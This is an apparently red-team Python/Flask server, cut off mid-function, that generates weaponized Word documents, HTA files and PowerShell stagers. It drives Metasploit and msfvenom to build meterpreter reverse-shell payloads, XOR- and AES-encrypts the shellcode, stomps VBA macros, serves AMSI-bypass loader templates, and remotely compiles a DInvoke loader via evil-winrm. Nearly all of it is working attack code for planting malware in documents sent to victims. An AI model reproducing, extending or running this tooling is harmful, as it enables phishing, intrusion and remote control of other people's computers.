from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
import Crypto
from pathlib import Path
import pathlib
import base64
import hashlib
import ipaddress
import itertools
import json
import logging
import os
import re
import subprocess
import sys
from typing import Optional, Dict, List, Tuple
import olefile
from io import BytesIO
import hashlib
import json
import logging
import os
import subprocess
from time import sleep
from typing import Optional, List, Dict
import base64
import random
from flask import request
from pymetasploit3.msfrpc import MsfRpcClient

from flask import Flask, render_template, Blueprint, render_template_string, request, send_from_directory, send_file, \
    current_app, redirect

from logging.config import dictConfig

from pymetasploit3.msfrpc import MsfRpcClient

# import vba
# from hta import create_hta
# from payload import LISTENER_CONFIGS, generate_payload, get_host, PAYLOAD_DIR, setup_listener
# from powershell import encode_ps, powershell_base64

import binascii
import itertools
import logging
import os
import struct
import binascii
from io import BytesIO
from typing import Optional, List

from olefile import olefile
from oletools.olevba import decompress_stream, copytoken_help
from pcodedmp.pcodedmp import getWord, getDWord

logger = logging.getLogger(__name__)
win = Blueprint('win', __name__)
lin = Blueprint('lin', __name__)
crypt = Blueprint('crypt', __name__)
info = Blueprint('info', __name__)


SAFE_ADAPTERS = {"tun0", "eth0", "wlan0", "lo"}

EGG_START = b"START_AES_HERE_"
EGG_END = b"_END_AES_HERE"

PWD_START = b"PASSWORD_START_"
PWD_END = b"_PASSWORD_STOP"

SALT_HEADER = b"Salted__"


first_PADDING = b"\x00"
rest_PADDING = b"\x20"


PAYLOAD_DIR = "payloads"

BASIC_LISTENER_CONFIG = {
    "PingbackSleep": 10,
    "OverrideRequestHost": True,
    "ReverseListenerBindAddress": "127.0.0.1",
    "ReverseListenerBindPort": 50000,
}


# Base payloads without architecture
CFGS = [
    "windows/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_winhttps",
    "linux/meterpreter_reverse_https",
    "windows/pingback_reverse_tcp",
    "windows/messagebox",
    "windows/exec",
]

LISTENER_CONFIGS = {}

for cfg in CFGS:
    parts = cfg.split('/')
    platform = parts[0]
    payload = "/".join(parts[1:])

    key = cfg.replace('/', '_')

    LISTENER_CONFIGS[key] = {}
    for arch in (32, 64):
        full_payload = f"{platform}/x{arch}/{payload}"
        if arch == 32:
            full_payload = f"{platform}/{payload}"

        LISTENER_CONFIGS[key][arch] = {
            "Payload": full_payload,
        }

        if "https" in full_payload:
            LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | BASIC_LISTENER_CONFIG 
            if 'win' in full_payload:
                LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | {"HttpProxyIE": False}

# from pprint import pprint
# pprint(LISTENER_CONFIGS)

msf_client = None

with open('./PASSWORD_MsfRpcClient.txt', 'r') as f:
    PASSWORD_MsfRpcClient = f.read().strip()

with open('templates/WIN_PS_COMMAND.ps1', 'r') as f:
    WIN_PS_COMMAND = f.read().strip()

with open('templates/WIN_START.ps1', 'r') as f:
    WIN_START_TEMPLATE = f.read().strip()

with open('templates/WIN_BYPASS.ps1', 'r') as f:
    WIN_BYPASS_TEMPLATE = f.read().strip()

with open('templates/WIN_LOADER_32.ps1', 'r') as f:
    WIN_LOADER_32_TEMPLATE = f.read().strip()

with open('templates/WIN_DELEGATE.ps1', 'r') as f:
    WIN_DELEGATE_TEMPLATE = f.read().strip()

with open('templates/WIN_VBA_OUT.ps1', 'r') as f:
    WIN_VBA_OUT_TEMPLATE = f.read().strip()


def findmarker(content):
    marker = ("A" * 100).encode()
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find("!".encode(), offset + len(marker))
        if offset_end != -1:
            return offset, offset_end - offset

    return -1, 0


def findmarker_old(content):
    marker = b''.join(bytes([0xAC, 0x00, int(c, 16), 0x00])
                      for c in "DEADBEEFCAFEBABE")
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(marker, offset + len(marker))
        if offset_end != -1:
            return offset, ((offset_end + len(marker)) - offset) // 4

    return -1, 0


def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    # stream.read(length * 4)
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    contents = contents[:offset] + encrypted_bytes_instructions + \
        contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    # new_bytes = stream.read(length * 4)
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    print(old_bytes)
    print(new_bytes)

    return contents


def get_vba_offsets(contents):
    offset = 0

    vba_offsets = {}

    module_name = ""
    module_offset = 0

    while offset < len(contents):
        tag = getWord(contents, offset, '<')
        wLength = getDWord(contents, offset + 2, '<')

        if tag == 9:
            wLength = 6
        elif tag == 3:
            wLength = 2

        match tag:
            case 26:
                module_name = contents[offset +
                                       6:offset + 6 + wLength].decode('utf-8')
                print(f"Module name: {module_name}")
            case 49:
                module_offset = getDWord(contents, offset + 6, '<')
                print(f"Module offset: {module_offset}")
                vba_offsets[module_name] = module_offset

        offset += 6
        offset += wLength

    return vba_offsets


def open_word_template(template_path: str):
    with open(template_path, 'rb') as file:
        template_file = file.read()

    file_data = BytesIO(template_file)
    ole = olefile.OleFileIO(file_data, write_mode=True)

    if not ole.exists("Macros/VBA/dir"):
        logger.error(f"OLE dir Macros/VBA/dir does not exist")
        return None, None

    return file_data, ole


def generate_word_file(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool) -> Optional[BytesIO]:
    file_data, ole = open_word_template(template_path)

    for x in encrypted_payloads:
        print(len(x))
        print(f"{(len(x)):04X}")
        print(','.join(str(b) for b in x))

    data_to_write = (''.join(map(
        lambda x: f"{(len(x)):04X}{binascii.hexlify(x).decode().upper()}", encrypted_payloads))).encode()

    if not file_data:
        return None

    contents = ole.openstream("WordDocument").read()
    offset, length = findmarker(contents)

    if offset != -1:
        logger.info(
            f"Marker found in document at: [{offset}] length: [{length}]")

        if length < len(data_to_write):
            logger.error(
                f"Payload is too big for document! ({len(data_to_write)} > {length})")
            return None

        contents = replacemarker(contents, offset, data_to_write)
        ole.write_stream(f"WordDocument", contents)

    if stomp_vba:
        dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())

        module_offsets = get_vba_offsets(dir_stream)
        biggest_offset = sorted(module_offsets.items(),
                                key=lambda x: x[1], reverse=True)[0][1]
        contents = ole.openstream(f"Macros/VBA/NewMacros").read()
        contents = contents[:biggest_offset].ljust(len(contents), b'\x00')
        ole.write_stream(f"Macros/VBA/NewMacros", contents)
    ole.close()
    file_data.seek(0)

    return file_data


def powershell_base64(command):
    command_bytes = command.encode('utf-16le')
    base64_encoded = base64.b64encode(command_bytes)
    return base64_encoded.decode('ascii')


def regular_base64(command):
    command_bytes = command.encode('utf-8')
    base64_encoded = base64.b64encode(command_bytes)
    return base64_encoded.decode('ascii')


def random_capitalize(input_string):
    result = ""
    for char in input_string.lower():
        if char.isalpha():
            if random.choice([True, False]):
                result += char.upper()
            else:
                result += char.lower()
        else:
            result += char

    return result


def encode_ps(command):
    return f"{random_capitalize("iex")}([{random_capitalize("System.Text.Encoding")}]::{random_capitalize("UTF8.GetString")}([{random_capitalize("System.Convert")}]::{random_capitalize("FromBase64String")}('{regular_base64(command)}')))"


def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
    marker_url = 'http://111.111.111.111:12345/p/info/get?pad=a'.encode()
    replacement_url = url.ljust(len(marker_url), 'a').encode()

    file_data, ole = open_word_template(template_path)

    if not file_data:
        return None

    summary_stream = ole.openstream("\x05SummaryInformation").read()

    if summary_stream.find(marker_url) != -1:
        edited_summary = summary_stream.replace(marker_url, replacement_url)

        print(binascii.binascii.hexlify(summary_stream))
        print(binascii.binascii.hexlify(edited_summary))

        ole.write_stream("\x05SummaryInformation", edited_summary)

    ole.close()
    file_data.seek(0)

    return file_data


def findmarker(content):
    marker = (b"\x41" * 100)
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(b"\x21", offset + len(marker))
        if offset_end != -1:
            return offset, (offset_end - offset)

    return -1, 0


def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    # stream.read(length * 4)
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    contents = contents[:offset] + encrypted_bytes_instructions + \
        contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    # new_bytes = stream.read(length * 4)
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]

    print(old_bytes)
    print(new_bytes)

    return contents


def create_hta(encypted_bytes):
    with open("payload_holders/hta_library", 'rb') as f:
        contents = f.read()

    offset, length = findmarker(contents)

    if length < len(encypted_bytes):
        logger.error(
            f"Payload is too big for document! ({len(encypted_bytes)} > {length})")
        return None

    contents = replacemarker(contents, offset, encypted_bytes)

    return contents


try:
    msf_client = MsfRpcClient(PASSWORD_MsfRpcClient,
                              username='python', port=55555)
except Exception as e:
    logger.error("COULD NOT CONNECT TO MsfRpcClient")
    logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")


def generate_payload_hash(payload_props):
    param_string = json.dumps(payload_props, sort_keys=True)
    hash_obj = hashlib.sha256(param_string.encode())
    return hash_obj.hexdigest()


def generate_payload_props(payload_name: str,
                           lhost: Optional[str],
                           lport: Optional[int],
                           format: str,
                           additional_props: Optional[List[Dict[str, str]]] = None
                           ):
    if lhost is not None and lport is not None:
        additional_props = [{
            'lhost': lhost,
            'lport': lport,
        }] + (additional_props or [])

    return {
        'payload': payload_name,
        'format': format,
        'additional': additional_props or []
    }


def generate_payload(
    payload_name: str,
    lhost: Optional[str],
    lport: Optional[int],
    format: str,
    additional_props: Optional[List[Dict[str, str]]] = None
) -> str:
    # returns a path.
    params = generate_payload_props(
        payload_name, lhost, lport, format, additional_props)
    file_hash = generate_payload_hash(params)

    output_file_name = f"{file_hash}.{format}"
    output_path = f"{PAYLOAD_DIR}/{output_file_name}"

    os.makedirs(PAYLOAD_DIR, exist_ok=True)

    if os.path.exists(output_path):
        return output_file_name

    command = [
        'msfvenom',
        '-p', payload_name,
        '-f', format
    ]

    for propset in params['additional']:
        for key, value in propset.items():
            command.append(f"{key}={value}")

    try:
        print(f"Generating payload: {command}")

        result = subprocess.run(
            command,
            capture_output=True,
            text=False,
            check=True
        )

        with open(output_path, 'wb') as f:
            f.write(result.stdout)

        return output_file_name

    except subprocess.CalledProcessError as e:
        raise Exception(f"Payload generation failed: {e.stderr.decode()}")
    except Exception as e:
        raise Exception(f"Error generating payload: {str(e)}")


def get_host():
    host = request.headers['Incoming']

    if ':' in host:
        return host.split(':')[0], int(host.split(':')[1])
    else:
        return host, 443


def get_str(item):
    if type(item) == str:
        return item

    if type(item) == bool:
        return str(item).lower()

    if type(item) == int:
        return str(item)


def setup_listener(lhost, lport, config):
    if not msf_client:
        print(f"Not setting up listener for [{lhost}:{lport}]/[{config}]")
        return

    listener_config = config | {
        "LHOST": lhost,
        "LPORT": lport,
    }

    for job_id, job in msf_client.jobs.list.items():
        if job != 'Exploit: multi/handler':
            continue

        job_info = msf_client.jobs.info(job_id)

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            if config_name not in job_info['datastore'].keys():
                print(
                    f"Config {config_name} missing from [{job_info['datastore'].keys()}]")
                break

            if get_str(job_info['datastore'][config_name]) != get_str(config_value):
                print(
                    f"Config {config_name} mismatch in [{job_info['datastore'][config_name]}] != [{get_str(config_value)}]")
                break
        else:
            # This line is hit if all configs match
            print(f"Reusing the config: [{lhost}:{lport}]/[{config}]")
            break
    else:
        # This line is hit if no matching jobs were found
        logger.info(
            f"No matching listeners found for [{lhost}, {lport}, {config}]")

        print(f"No matching listeners found for [{lhost}, {lport}, {config}]")

        handler = msf_client.modules.use('exploit', 'multi/handler')
        payload = msf_client.modules.use('payload', listener_config['Payload'])

        handler["ExitOnSession"] = False

        for config_name, config_value in listener_config.items():
            if config_name == "Payload":
                continue

            payload[config_name] = config_value

        if len(handler.missing_required) > 0:
            print(
                f"Handler missing required configs: {handler.missing_required}")
        elif len(payload.missing_required) > 0:
            print(
                f"Payload missing required configs: {payload.missing_required}")
        else:
            print(f"Starting listener for [{lhost}, {lport}]")

            config_str = "\n".join(map(lambda t: f"{t[0]}: {t[1]}", list(
                listener_config.items()) + [("ExitOnSession", False)]))
            print(config_str)

            job_id = handler.execute(payload=payload)

            print(f"Started job id {job_id}")

            sleep(1)


dictConfig({
    'version': 1,
    'formatters': {'default': {
        'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
    }},
    'handlers': {'wsgi': {
        'class': 'logging.StreamHandler',
        'stream': 'ext://flask.logging.wsgi_errors_stream',
        'formatter': 'default'
    }},
    'root': {
        'level': 'INFO',
        'handlers': ['wsgi']
    }
})


def filter_string(input_string):
    return re.sub(r'[^a-zA-Z0-9_-]', '', input_string)


def filter_int(input_string):
    return int(re.sub(r'[^0-9]', '', input_string))


def encrypt_ps_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    for byte in content:
        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'0x{transformed_byte:02X},'

    # Remove trailing comma
    return transformed.rstrip(',')


def encrypt_vba_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    i = 0
    for byte in content:
        if i % 50 == 0 and i != 0:
            transformed += " _\n"

        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'{transformed_byte:d},'

        i += 1

    # Remove trailing comma
    return transformed.rstrip(',')


def encrypt_raw_payload(payload_file: str) -> bytearray:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = bytearray(f.read())

        for i in range(len(content)):
            content[i] = (((content[i] + 2) & 0xFF) ^ 0x75)

        return content


def encrypt_raw_payload_bytes(payload: bytearray) -> bytearray:
    for i in range(len(payload)):
        payload[i] = (((payload[i] + 2) & 0xFF) ^ 0x75)

    return payload


def ps(id, stage, proxy=False):
    id = filter_string(id)

    if id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if proxy:
        payload_type = "ps_proxy"
    else:
        payload_type = "ps"

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host, id=id, type=payload_type, proxy=proxy)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=id, type=payload_type, proxy=proxy)

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=id, type=payload_type, proxy=proxy)

    if stage == 'delegate':
        payloads_generated = gen_multiple_payloads(
            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[64]
        )
        payload_x64 = encrypt_ps_payload(payloads_generated[64])
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=payload_x64)


@win.route('/ps/<id>/<stage>')
def ps_noproxy(id, stage):
    return ps(id, stage)


@win.route('/ps_proxy/<id>/<stage>')
def ps_proxy(id, stage):
    return ps(id, stage, proxy=True)


@win.route('/ps/get_command', methods=['POST'])
def ps_get_command():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = request.form['id']
    proxy = ('system_proxy' in request.form.keys())

    if proxy:
        ps_type = "ps_proxy"
    else:
        ps_type = "ps"

    command_text = render_template_string(
        WIN_PS_COMMAND,
        lhost=lhost,
        lport=lport,
        id=id,
        type=ps_type,
        proxy=proxy
    ).strip()

    encoded_command = encode_ps(command_text)

    return command_text + "\n\n" + encoded_command + "\n\n" + powershell_base64(encoded_command)


@win.route('/tcp/<id>/<stage>')
def tcp(id, stage):
    id = filter_int(id)

    if id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=id, type='tcp')

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=id, type='tcp')

    if stage == 'delegate':
        setup_listener(
            lhost,
            id,
            LISTENER_CONFIGS["PS_TCP"]
        )

        raw_payload_file = generate_payload(
            LISTENER_CONFIGS["PS_TCP"]["Payload"],
            lhost,
            id,
            'raw',
            [

            ]
        )
        ps_string = encrypt_ps_payload(raw_payload_file)
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)


def get_ip(adapter: str) -> str:
    if adapter not in SAFE_ADAPTERS:
        adapter = "tun0"
    try:
        return os.popen(
            f"ip a s {adapter} | grep 'inet ' | awk '{{print $2}}' | sed 's/\\/.*//g'"
        ).read().strip()
    except Exception:
        return ""


@win.route('/')
def word_form():
    import os
    template = ""
    template += f"<br>"
    template += f"{request.headers['Incoming']}{request.path}?ladapter=tun0&lport=443&uid=test"
    # template = template.replace('tun0', get_host()[0])
    # template = "reminder:<br>"
    # template += "?ladapter=eth0&lport=443&uid=test"
    template += render_template('1_win_form.html')
    
    ladapter = request.args.get('ladapter', '')
    lport = request.args.get('lport', 443)
    uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
    print(f"{ladapter=}")
    print(f"{lport=}")
    print(f"{uid=}")
    template = template.replace(
        'name="lhost" value=""', f'name="lhost" value="{get_ip(ladapter)}"')
    template = template.replace(
        'name="lport" value=""', f'name="lport" value="{str(lport)}"')
    template = template.replace(
        'name="id" value=""', f'name="id" value="{str(uid)}"')
    return template


def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64], extra_args = {"LURI": "","HttpProxyIE": False}):
    retval = {}
    print(f"{archs=}")
    for arch in archs:
        endpoint_msfvenom = f"/{endpoint}/{id}_{str(arch)}/"
        if "LURI" in extra_args.keys():
            extra_args["LURI"] = endpoint_msfvenom
        print(f"{config=}")
        print(f"{endpoint_msfvenom=}")
        print(f"{LISTENER_CONFIGS[config][arch]=}")
        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS[config][arch] | extra_args
        )
        a = generate_payload(
            LISTENER_CONFIGS[config][arch]["Payload"],
            lhost,
            lport,
            'raw',
            [
                extra_args
            ]
        )
        retval[arch] = a
    return retval


def openssl_pbkdf2_encrypt(plaintext: bytes, password: str) -> bytes:
    salt = get_random_bytes(8)
    key_iv = PBKDF2(password.encode(), salt, dkLen=48,
                    count=10_000, hmac_hash_module=SHA256)
    key, iv = key_iv[:32], key_iv[32:]

    pad_len = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad_len]) * pad_len

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)

    return base64.b64encode(SALT_HEADER + salt + encrypted)


def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, password: str):
    doc_data = doc_path.read_bytes()
    raw_shellcode = shellcode_path.read_bytes()

    print(f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
    print(f"{password=}")

    b64_payload = openssl_pbkdf2_encrypt(raw_shellcode, password)

    egg_start_idx = doc_data.find(EGG_START)
    if egg_start_idx == -1:
        raise ValueError("START_AES_HERE marker not found")

    egg_end_idx = doc_data.find(EGG_END, egg_start_idx)
    if egg_end_idx == -1:
        raise ValueError("_END_AES_HERE marker not found")

    egg_end_idx += len(EGG_END)
    egg_region_len = egg_end_idx - egg_start_idx

    if len(b64_payload) > egg_region_len:
        raise ValueError(
            f"Encrypted payload ({len(b64_payload)} B) exceeds region ({egg_region_len} B)"
        )

    padding_len = egg_region_len - len(b64_payload)
    padded_payload = b64_payload + rest_PADDING * padding_len

    patched = (
        doc_data[:egg_start_idx] +
        padded_payload +
        doc_data[egg_end_idx:]
    )

    b64_pass = base64.b64encode(password.encode())
    print(f"patch_document{b64_pass =}\n{b64_payload = }")

    pwd_start_idx = patched.find(PWD_START)
    if pwd_start_idx == -1:
        raise ValueError("PASSWORD_START_ marker not found")

    pwd_end_idx = patched.find(PWD_END, pwd_start_idx)
    if pwd_end_idx == -1:
        raise ValueError("_PASSWORD_STOP marker not found")

    pwd_end_idx += len(PWD_END)
    pwd_region_len = pwd_end_idx - pwd_start_idx

    if len(b64_pass) > pwd_region_len:
        raise ValueError(
            f"Base‑64 password ({len(b64_pass)} B) exceeds region ({pwd_region_len} B)"
        )

    pwd_padding_len = pwd_region_len - len(b64_pass)
    padded_b64_pass = b64_pass + rest_PADDING * pwd_padding_len

    patched = (
        patched[:pwd_start_idx] +
        padded_b64_pass +
        patched[pwd_end_idx:]
    )

    out_path.write_bytes(patched)

    print(
        f"[+] Patched '{out_path}'. Inserted {len(b64_payload)}‑byte payload "
        f"and embedded {len(b64_pass)}‑byte password (region sizes preserved)."
    )


def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, arch: int = 32, proxy: bool = False, payload_type: str = "windows_meterpreter_reverse_winhttps") -> bytes:
    """
    Genereer AES-versleutelde payload (Base64) op basis van ID, arch, host, etc.
    """
    id = filter_string(id)
    if id == "":
        raise ValueError("Invalid id")

    payloads = gen_multiple_payloads(
        lhost, lport, proxy, id, config=payload_type, endpoint="ms", archs=[arch], extra_args={"LURI": "replaceme", "HttpProxyIE": proxy}
    )

    raw_bytes = payloads[arch]
    if isinstance(raw_bytes, str):
        with open(f"{PAYLOAD_DIR}/{raw_bytes}", 'rb') as f:
            raw_bytes = f.read()

    return openssl_pbkdf2_encrypt(raw_bytes, password)


def generate_encrypted_payloads(id: str, lhost: str, lport: int, password: str, archs: list = [32, 64], proxy: bool = False, payload_type: str = "windows_meterpreter_reverse_winhttps") -> dict:
    retval = {}
    for i in archs:
        retval[i] = generate_encrypted_payload(
            id, lhost, lport, password, arch=int(i), proxy=proxy, payload_type=payload_type)
    return retval

def generate_dinvoke_x64_x86(input_data: Dict) -> Optional[BytesIO]:
    retval = {}

    path_winrm_commands = "/tmp/winrm-commands.txt"
    path_template_cs_dinvoke = "/mnt/exploits/DInvoke/setup/stage-12.cs"
    payload_output_path = f"{PAYLOAD_DIR}/stage-12.cs"
    winrm_builder_host = "10.1.1.51"

    # Read builder credentials
    with open("CREDS_WINRM_BUILDER.txt", "r") as f:
        username, password = map(str.strip, f.read().split(":", 1))

    # Validate required keys
    required_keys = [32, 64, 'ps', 'password']
    missing_keys = [k for k in required_keys if k not in input_data]
    if missing_keys:
        raise ValueError(f"input_data is missing required keys: {missing_keys}")



    # with open(f"{PAYLOAD_DIR}/{input_data[32]}", 'rb') as f:
    #     p_32 = f.read()
    # with open(f"{PAYLOAD_DIR}/{input_data[64]}", 'rb') as f:
    #     p_64 = f.read()
    print(f"{input_data = }")
    # exit()
    replacements = {
        'REPLACE_WITH_MSFVENOM_PASSWORD': input_data['password'],
        'REPLACE_WITH_x86_MSFVENOM_OUTPUT': input_data[32].decode('latin-1'),
        'REPLACE_WITH_x64_MSFVENOM_OUTPUT': input_data[64].decode('latin-1'),
        'REPLACE_WITH_POWERSHELL_PAYLOAD': input_data['ps'],
    }

    # Load and patch payload
    with open(path_template_cs_dinvoke, "r") as f:
        payload = f.read()


    for placeholder, replacement in replacements.items():
        payload = payload.replace(placeholder, replacement)

    # Write patched payload
    with open(payload_output_path, "w") as f:
        f.write(payload)

    # Prepare WinRM commands
    winrm_command = rf"""del .\stage-12.cs
del .\exploit-program.exe
upload {payload_output_path}
$dinvokePath = "C:\Tools\NuGetPkgs\DInvoke.1.0.4\lib\net35\DInvoke.dll"
$sma = [System.Management.Automation.PowerShell].Assembly.Location
& C:\Windows\Microsoft.NET\Framework\v4.0.*\csc.exe /resource:"$dinvokePath",DInvoke.dll /reference:"$sma" /target:exe /platform:anycpu /out:exploit-program.exe .\stage-12.cs /optimize+ /d:TRACE /filealign:512
cd donut*
.\donut.exe ..\exploit-program.exe -o ..\exploit-program.bin
cd ..
download ./exploit-program.exe /tmp/loader.exe
download ./exploit-program.bin /tmp/loader.bin
exit"""

    print(winrm_command)

    # Write command file
    with open(path_winrm_commands, "w") as f:
        f.write(winrm_command)

    # Run evil-winrm session
    os.system(f'cat {path_winrm_commands} | evil-winrm -i {winrm_builder_host} -u {username} -p {password}')

    # Optional: check output binary type
    with os.popen('file /tmp/loader.exe') as f:
        print(f.read())

    with open('/tmp/loader.bin', 'rb') as f:
        return f.read()


def generate_word_pingback_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
    from tempfile import NamedTemporaryFile
    import uuid
    
    if proxy:
        ps_type = "ps_proxy"
    else:
        ps_type = "ps"
    command_text = f"ping -n 1 {lhost}"
    password = str(uuid.uuid4()).replace('-', '')
    encoded_powershell_command = encode_ps(command_text)


    payloads = {}
    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
        shellcode_path = pathlib.Path(shellcode_file.name)
        os.system(f'''msfvenom -a x86 -p windows/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
        shellcode_file.seek(0)
        raw_bytes_x32 = shellcode_file.read()
        # payloads[32] = raw_bytes_x32
        payloads[32] = openssl_pbkdf2_encrypt(raw_bytes_x32, password)

    # 64-bit payload
    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
        shellcode_path = pathlib.Path(shellcode_file.name)
        os.system(f'''msfvenom -p windows/x64/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
        shellcode_file.seek(0)
        raw_bytes_x64 = shellcode_file.read()
        # payloads[64] = raw_bytes_x64
        payloads[64] = openssl_pbkdf2_encrypt(raw_bytes_x64, password)


    
    print(f"{payloads =}")
    payloads['ps'] = encoded_powershell_command
    payloads['password'] = password
    
    payload_entry = generate_dinvoke_x64_x86(payloads)

    if isinstance(payload_entry, str):
        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
            shellcode = f.read()
    elif isinstance(payload_entry, bytes):
        shellcode = payload_entry
    else:
        raise ValueError("Unsupported shellcode payload type")

    # password = str(uuid.uuid4()).replace('-', '')

    with NamedTemporaryFile(delete=False) as shellcode_file:
        shellcode_path = pathlib.Path(shellcode_file.name)
        shellcode_file.write(shellcode)

    doc_path = pathlib.Path(template_path)
    with NamedTemporaryFile(delete=False) as output_file:
        output_path = pathlib.Path(output_file.name)
    

    # shellcode_path = pathlib.Path("/tmp/loader.bin")

    patch_document(doc_path, shellcode_path, output_path, password)

    with open(output_path, 'rb') as f:
        patched_data = f.read()

    return BytesIO(patched_data)

def generate_word_revshell_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
    from tempfile import NamedTemporaryFile
    import uuid
    
    if proxy:
        ps_type = "ps_proxy"
    else:
        ps_type = "ps"
    command_text = render_template_string(
        WIN_PS_COMMAND,
        lhost=lhost,
        lport=lport,
        id=id,
        type=ps_type,
        proxy=proxy
    ).strip()
    password = str(uuid.uuid4()).replace('-', '')
    encoded_powershell_command = encode_ps(command_text)
    payloads = generate_encrypted_payloads(
                id=id,
                lhost=lhost,
                lport=int(lport),
                password=password,
                archs=[32, 64],
                proxy=proxy
            )
    print(f"{payloads =}")
    payloads['ps'] = encoded_powershell_command
    payloads['password'] = password
    
    payload_entry = generate_dinvoke_x64_x86(payloads)

    if isinstance(payload_entry, str):
        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
            shellcode = f.read()
    elif isinstance(payload_entry, bytes):
        shellcode = payload_entry
    else:
        raise ValueError("Unsupported shellcode payload type")

    # password = str(uuid.uuid4()).replace('-', '')

    with NamedTemporaryFile(delete=False) as shellcode_file:
        shellcode_path = pathlib.Path(shellcode_file.name)
        shellcode_file.write(shellcode)

    doc_path = pathlib.Path(template_path)
    with NamedTemporaryFile(delete=False) as output_file:
        output_path = pathlib.Path(output_file.name)
    
    # shellcode_path = pathlib.Path("/mnt/exploits/DInvoke/bin/loader-eth0-80-stager-vba-eth0-4f02037210b546e096513f690b24974f.bin")

    shellcode_path = pathlib.Path("/tmp/loader.bin")

    patch_document(doc_path, shellcode_path, output_path, password)

    with open(output_path, 'rb') as f:
        patched_data = f.read()

    return BytesIO(patched_data)


@win.route('/word_form/get', methods=['POST'])
def word_get():
    payload_type = request.form['type']
    stomp_vba = ('stomp_vba' in request.form.keys())
    proxy = ('system_proxy' in request.form.keys())
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = filter_string(request.form['id'])


    if id == "":
        return "Invalid id", 400

    if payload_type == "vba_shellcode":
        payloads = gen_multiple_payloads(
            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
        )
        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
        word_file_stream = generate_word_file(
            template_path, [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])], stomp_vba)
    elif payload_type == "aes_shellcode_revshell":
        template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
        word_file_stream = generate_word_revshell_aes(
            lhost, lport, proxy, id, template_path, stomp_vba
        )

    elif payload_type == "aes_shellcode_pingback":
        template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
        word_file_stream = generate_word_pingback_aes(
            lhost, lport, proxy, id, template_path, stomp_vba
        )
    else:
        return "Invalid type", 400

    return send_file(
        word_file_stream,
        as_attachment=False,
